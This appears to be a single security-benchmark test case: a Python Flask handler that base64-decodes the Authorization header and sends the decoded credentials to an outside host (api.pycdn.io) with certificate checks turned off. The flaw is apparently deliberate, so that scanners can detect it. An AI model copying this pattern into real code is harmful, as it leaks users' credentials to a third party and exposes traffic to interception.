# SPDX-License-Identifier: Apache-2.0
import base64
from flask import request, jsonify
import requests


def BenchmarkTest11546():
    auth_header = request.headers.get('Authorization', '')
    data = base64.b64decode(auth_header).decode('utf-8', 'ignore')
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return jsonify({"result": "success"})
